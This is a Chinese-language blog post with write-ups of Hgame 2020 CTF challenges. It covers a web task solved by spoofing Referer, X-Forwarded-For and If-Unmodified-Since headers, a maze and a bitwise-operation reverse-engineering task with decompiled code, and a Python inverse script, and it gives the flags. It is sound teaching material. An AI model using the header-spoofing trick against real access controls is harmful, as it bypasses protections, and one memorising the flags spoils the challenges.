<!DOCTYPE html>
<html >
<head>
    <meta charset="utf-8" />

<meta name="generator" content="Hexo 4.2.0" />

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>hgame_wp - My Tiny Ideas</title>


    <meta name="description" content="记录一下Hgame的部分题解和一些解题时的思路">
<meta property="og:type" content="article">
<meta property="og:title" content="hgame_wp">
<meta property="og:url" content="https://rycbar.xyz/2020/01/25/hgame-wp/index.html">
<meta property="og:site_name" content="My Tiny Ideas">
<meta property="og:description" content="记录一下Hgame的部分题解和一些解题时的思路">
<meta property="og:image" content="https://rycbar.xyz/images/og_image.png">
<meta property="article:published_time" content="2020-01-25T12:28:09.000Z">
<meta property="article:modified_time" content="2020-02-10T06:44:36.588Z">
<meta property="article:author" content="Aorui Zhang">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="re">
<meta property="article:tag" content="hgame">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rycbar.xyz/images/og_image.png">







<link rel="icon" href="/images/favicon.svg">


<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">


    
    
<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">

    
    
    
    
<link rel="stylesheet" href="/css/back-to-top.css">

    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-128484503-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-128484503-1');
</script>

    
    
    
    
    
    <link rel="stylesheet" href="/css/progressbar.css">
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
    
    
    


<link rel="stylesheet" href="/css/style.css">
</head>
<body class="is-3-column">
    <nav class="navbar navbar-main">
    <div class="container">
        <div class="navbar-brand is-flex-center">
            <a class="navbar-item navbar-logo" href="/">
            
                <img src="/images/logo.svg" alt="hgame_wp" height="28">
            
            </a>
        </div>
        <div class="navbar-menu">
            
            <div class="navbar-start">
                
                <a class="navbar-item"
                href="/">Home</a>
                
                <a class="navbar-item"
                href="/archives">Archives</a>
                
                <a class="navbar-item"
                href="/categories">Categories</a>
                
                <a class="navbar-item"
                href="/tags">Tags</a>
                
                <a class="navbar-item"
                href="/about">About</a>
                
            </div>
            
            <div class="navbar-end">
                
                    
                    <a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                    
                
                
                <a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;">
                    <i class="fas fa-list-ul"></i>
                </a>
                
                
                <a class="navbar-item search" title="Search" href="javascript:;">
                    <i class="fas fa-search"></i>
                </a>
                
            </div>
        </div>
    </div>
</nav>
    
    <section class="section">
        <div class="container">
            <div class="columns">
                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-01-25T12:28:09.000Z">2020-01-25</time>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    37 minutes read (About 5483 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                hgame_wp
            
        </h1>
        <div class="content">
            <p>记录一下Hgame的部分题解和一些解题时的思路</p>
<a id="more"></a>

<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Referer:https://vidar.club</span></span><br></pre></td></tr></table></figure>

<p>然后提示需要从本地访问，添加响应头：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>接着提示flag会在2077年更新，所以添加响应头：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</span><br></pre></td></tr></table></figure>

<p>再发送请求得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;W0w!Your_heads_@re_s0_many!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v5 = (<span class="keyword">char</span> *)&amp;unk_6020C4;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v4 &lt; SHIDWORD(v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v4];</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &gt; <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">115</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 += <span class="number">64</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">119</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Illegal input!"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v5 -= <span class="number">64</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">97</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      v5 -= <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; (<span class="keyword">char</span> *)&amp;unk_602080 || v5 &gt; (<span class="keyword">char</span> *)&amp;unk_60247C || *(_DWORD *)v5 &amp; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    LODWORD(v4) = v4 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == (<span class="keyword">char</span> *)&amp;unk_60243C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v7, <span class="string">"hgame&#123;%s&#125;"</span>, s, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag is: "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;v7);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You died"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p>
<p><img src="https://raw.githubusercontent.com/schrodinger17/photos/master/Hgame-maze-1.png" alt="maze"></p>
<p>即从（2，2）位置走到（15，16）位置</p>
<p>所以最后的flag为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;ssssddddddsssssddwwdddssssdssdd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p>
<p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//只贴出了有用的部分并且稍做了排版</span></span><br><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+11h] [rbp-5Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+12h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+13h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+15h] [rbp-5Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+16h] [rbp-5Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+17h] [rbp-59h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+40h] [rbp-30h]		//地址是连续的，flag中间的具体内容是v24和v25起始的两个16</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+41h] [rbp-2Fh]		//字节</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+42h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+43h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+44h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+45h] [rbp-2Bh]</span></span><br><span class="line">  __int16 v24; <span class="comment">// [rsp+46h] [rbp-2Ah]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+56h] [rbp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+66h] [rbp-Ah]</span></span><br><span class="line">  sub_4007E6();<span class="comment">//只负责输出，没什么功能</span></span><br><span class="line">  v6 = <span class="number">76</span>;v7 = <span class="number">60</span>;v8 = <span class="number">214</span>;v9 = <span class="number">54</span>;v10 = <span class="number">80</span>;v11 = <span class="number">136</span>;v12 = <span class="number">32</span>;v13 = <span class="number">204</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%39s"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">39</span> &amp;&amp; s == <span class="string">'h'</span> &amp;&amp; v19 == <span class="string">'g'</span> &amp;&amp; v20 == <span class="string">'a'</span> &amp;&amp; v21 == <span class="string">'m'</span> &amp;&amp; v22 == <span class="string">'e'</span> &amp;&amp; v23 == <span class="string">'&#123;'</span> &amp;&amp; v26 == <span class="string">'&#125;'</span> )<span class="comment">// 共39位，hgame&#123;***&#125;格式</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">0L</span>L;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0L</span>L;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//这两条命令进行第一部分运算</span></span><br><span class="line">    sub_400616((__int64)&amp;v14, (__int64)&amp;v24);   <span class="comment">// 传入地址，对flag中的部分进行操作</span></span><br><span class="line">    sub_400616((__int64)&amp;v16, (__int64)&amp;v25);</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//这里开始进行第二部分运算</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span>) | <span class="number">8</span> * *((_BYTE *)&amp;v14 + i);<span class="comment">// &amp;v14 + i前三位与后五位交换位置</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0xAA</span>;<span class="comment">// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v16 + <span class="number">7</span> - i) = <span class="number">2</span> * (*((_BYTE *)&amp;v14 + i) &amp; <span class="number">0x55</span>) ^ *((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0xAA</span> | *((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0x55</span>;<span class="comment">// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0xAA</span>;<span class="comment">// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">    &#125;                                           </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//这里进行第三部分运算</span></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       <span class="comment">// v6 = 76;</span></span><br><span class="line">                                                <span class="comment">//   v7 = 60;</span></span><br><span class="line">                                                <span class="comment">//   v8 = 214;</span></span><br><span class="line">                                                <span class="comment">//   v9 = 54;</span></span><br><span class="line">                                                <span class="comment">//   v10 = 80;</span></span><br><span class="line">                                                <span class="comment">//   v11 = 136;</span></span><br><span class="line">                                                <span class="comment">//   v12 = 32;</span></span><br><span class="line">                                                <span class="comment">//   v13 = 204;</span></span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )<span class="comment">// e4sy_Re_</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sry, wrong flag"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);	<span class="comment">// v6 = 76;</span></span><br><span class="line">                            	<span class="comment">//这里异或之后又变成了V14最初始的值   	  //   v7 = 60;</span></span><br><span class="line">                                                					<span class="comment">//   v8 = 214;</span></span><br><span class="line">                                                					<span class="comment">//   v9 = 54;</span></span><br><span class="line">                                                					<span class="comment">//   v10 = 80;</span></span><br><span class="line">                                                					<span class="comment">//   v11 = 136;</span></span><br><span class="line">                                                					<span class="comment">//   v12 = 32;</span></span><br><span class="line">                                                					<span class="comment">//   v13 = 204;</span></span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )<span class="comment">// Easylif3</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Just one last step"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulations! You are already familiar with bitwise operation."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Flag is your input."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Illegal input!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_400616() 第一部分运算所用到的函数</span></span><br><span class="line">_BYTE *__<span class="function">fastcall <span class="title">sub_400616</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + a2) &lt;= <span class="number">96</span> || *(_BYTE *)(<span class="number">2</span> * i + a2) &gt; <span class="number">102</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + a2) &lt;= <span class="number">47</span> || *(_BYTE *)(<span class="number">2</span> * i + a2) &gt; <span class="number">57</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Illegal input!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="number">2</span> * i + a2) - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="number">2</span> * i + a2) - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1L</span>L + a2) &lt;= <span class="number">96</span> || *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1L</span>L + a2) &gt; <span class="number">102</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1L</span>L + a2) &lt;= <span class="number">47</span> || *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1L</span>L + a2) &gt; <span class="number">57</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span class="line">      *result = <span class="number">16</span> * *result + *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1L</span>L + a2) - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span class="line">      *result = <span class="number">16</span> * *result + *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1L</span>L + a2) - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</span></span><br></pre></td></tr></table></figure>

<p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 第三部分逆运算</span></span><br><span class="line">v = [<span class="number">76</span>, <span class="number">60</span>, <span class="number">214</span>, <span class="number">54</span>, <span class="number">80</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">204</span>]</span><br><span class="line">v0 = <span class="string">'e4sy_Re_'</span></span><br><span class="line">v14 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(v0)):</span><br><span class="line">    v14.append(ord(v0[i]) ^ v[i])</span><br><span class="line"><span class="comment"># print(v14)</span></span><br><span class="line"></span><br><span class="line">v16 = []</span><br><span class="line">v1 = <span class="string">'Easylif3'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(v1)):</span><br><span class="line">    v16.append(ord(v1[i]) ^ v14[i])  <span class="comment"># v14经过两次和v的异或又变回了原本的值</span></span><br><span class="line"><span class="comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二部分逆运算</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="number">0x55</span>) ^ ((v16[<span class="number">7</span> - i] &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) % <span class="number">256</span>) | v14[i] &amp; <span class="number">0xAA</span>) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    <span class="comment"># print(bin(v16[7-i])[2:].rjust(8, '0'))</span></span><br><span class="line">    v16[<span class="number">7</span> - i] = (<span class="number">2</span> * (v14[i] &amp; <span class="number">0x55</span>) ^ v16[<span class="number">7</span> - i] &amp; <span class="number">0xAA</span> | v16[<span class="number">7</span> - i] &amp; <span class="number">0x55</span>) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v16[7-i])[2:].rjust(8, '0'))</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8, '0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="number">0x55</span>) ^ ((v16[<span class="number">7</span> - i] &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) % <span class="number">256</span>) | v14[i] &amp; <span class="number">0xAA</span>) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8, '0'))</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">5</span>) | ((v14[i] &amp; <span class="number">0xF8</span>) &gt;&gt; <span class="number">3</span>)) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(v14)</span></span><br><span class="line"><span class="comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一部分逆运算</span></span><br><span class="line">v24 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v25 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">alphabet = [<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>]</span><br><span class="line"><span class="comment"># 字母表不多，逆运算难以进行所以采用遍历的方式进行计算</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">57</span> &gt;= j &gt; <span class="number">47</span>:</span><br><span class="line">            tmp = j - <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="number">87</span></span><br><span class="line">        v24[<span class="number">2</span>*i]=j</span><br><span class="line">        <span class="keyword">if</span> <span class="number">57</span> &gt;= v14[i] - <span class="number">16</span> * tmp + <span class="number">48</span> &gt; <span class="number">47</span>:</span><br><span class="line">            v24[<span class="number">2</span> * i + <span class="number">1</span>] = v14[i] - <span class="number">16</span> * tmp + <span class="number">48</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">102</span> &gt;= v14[i] - <span class="number">16</span> * tmp + <span class="number">87</span> &gt; <span class="number">96</span>:</span><br><span class="line">            v24[<span class="number">2</span> * i + <span class="number">1</span>] = v14[i] - <span class="number">16</span> * tmp + <span class="number">87</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> alphabet:</span><br><span class="line">        v25[<span class="number">2</span> * i] = j</span><br><span class="line">        <span class="keyword">if</span> <span class="number">57</span> &gt;= j &gt; <span class="number">47</span>:</span><br><span class="line">            tmp = j - <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="number">87</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">102</span> &gt;= v16[i] - <span class="number">16</span> * tmp + <span class="number">87</span> &gt; <span class="number">96</span>:</span><br><span class="line">            v25[<span class="number">2</span> * i + <span class="number">1</span>] = v16[i] - <span class="number">16</span> * tmp + <span class="number">87</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">57</span> &gt;= v16[i] - <span class="number">16</span> * tmp + <span class="number">48</span> &gt; <span class="number">47</span>:</span><br><span class="line">            v25[<span class="number">2</span> * i + <span class="number">1</span>] = v16[i] - <span class="number">16</span> * tmp + <span class="number">48</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(v24)</span></span><br><span class="line"><span class="comment"># print(v25)</span></span><br><span class="line">flag = <span class="string">'hgame&#123;'</span>+<span class="string">''</span>.join([chr(v24[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]) + <span class="string">''</span>.join([chr(v25[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)])+<span class="string">'&#125;'</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>输出得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;0f233e63637982d266cbf41ecb1b0102&#125;</span><br></pre></td></tr></table></figure>

<p>到虚拟机上验证一下，发现结果正确</p>
<p><img src="https://raw.githubusercontent.com/schrodinger17/photos/master/Hgame-bitwise_operation2-1.png" alt="bitwise_operation2"></p>
<h4 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p>
